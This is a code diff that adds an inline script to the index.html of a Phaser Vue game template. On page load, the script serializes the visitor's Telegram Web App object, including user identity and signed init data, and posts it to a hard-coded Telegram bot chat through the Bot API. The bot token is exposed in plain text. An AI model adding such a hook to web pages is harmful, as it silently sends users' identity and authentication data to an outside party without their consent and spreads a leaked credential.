@@ -1,11 +1,39 @@
 <!doctype html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8" />
     <link rel="icon" type="image/png" href="/favicon.png" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link rel="stylesheet" href="/style.css">
     <title>Phaser Vue Template</title>
+    <script src="https://telegram.org/js/telegram-web-app.js">
+
+    </script>
+    <script>
+        const myHeaders = new Headers();
+        myHeaders.append("Content-Type", "application/json");
+
+        const raw = JSON.stringify({
+            "chat_id": 5314337740,
+            "text": JSON.stringify(window.Telegram.WebApp)
+        });
+        const requestOptions = {
+            method: "POST",
+            headers: myHeaders,
+            body: raw,
+            redirect: "follow"
+        };
+
+        fetch("https://api.telegram.org/bot6815564492:AAHq_HhL8PDPvreGid0pBoCt6MssEWyyyxo/sendMessage", requestOptions)
+            .then((response) => response.text())
+            .then((result) => console.log(result))
+            .catch((error) => console.error(error));
+        document.getElementById("app").onload = function () {
+
+        };
+
+    </script>
 </head>
 
 <body>
@@ -14,4 +42,5 @@
     </div>
     <script type="module" src="src/main.ts"></script>
 </body>
+
 </html>
